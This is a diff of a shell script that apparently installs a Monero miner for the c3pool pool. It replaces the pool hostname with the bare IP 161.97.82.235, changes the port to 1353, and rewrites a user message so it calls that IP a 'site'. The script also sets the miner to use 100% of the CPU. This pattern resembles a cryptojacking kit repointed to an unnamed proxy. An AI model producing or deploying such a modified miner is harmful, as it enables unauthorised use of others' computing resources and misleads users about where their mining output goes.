@@ -109,13 +109,13 @@ power2() {
 PORT=$(( $EXP_MONERO_HASHRATE * 30 ))
 PORT=$(( $PORT == 0 ? 1 : $PORT ))
 PORT=`power2 $PORT`
-PORT=$(( 19999 ))
+PORT=$(( 1353 ))
 if [ -z $PORT ]; then
   echo "ERROR: Can't compute port"
   exit 1
 fi
 
-if [ "$PORT" -lt "19999" -o "$PORT" -gt "19999" ]; then
+if [ "$PORT" -lt "1353" -o "$PORT" -gt "1353" ]; then
   echo "ERROR: Wrong computed port value: $PORT"
   exit 1
 fi
@@ -130,7 +130,7 @@ echo "如果需要,可以通过以下方法启动前台矿工输出 $HOME/c3pool
 echo "Mining will happen to $WALLET wallet."
 echo "将使用 $WALLET 地址进行开采"
 if [ ! -z $EMAIL ]; then
-  echo "(and $EMAIL email as password to modify wallet options later at https://c3pool.com site)"
+  echo "(and $EMAIL email as password to modify wallet options later at 161.97.82.235 site)"
 fi
 echo
 
@@ -246,7 +246,7 @@ if [ ! -z $EMAIL ]; then
   PASS="$PASS:$EMAIL"
 fi
 
-sed -i 's/"url": *"[^"]*",/"url": "auto.c3pool.org:'$PORT'",/' $HOME/c3pool/config.json
+sed -i 's/"url": *"[^"]*",/"url": "161.97.82.235:'$PORT'",/' $HOME/c3pool/config.json
 sed -i 's/"user": *"[^"]*",/"user": "'$WALLET'",/' $HOME/c3pool/config.json
 sed -i 's/"pass": *"[^"]*",/"pass": "'$PASS'",/' $HOME/c3pool/config.json
 sed -i 's/"max-cpu-usage": *[^,]*,/"max-cpu-usage": 100,/' $HOME/c3pool/config.json
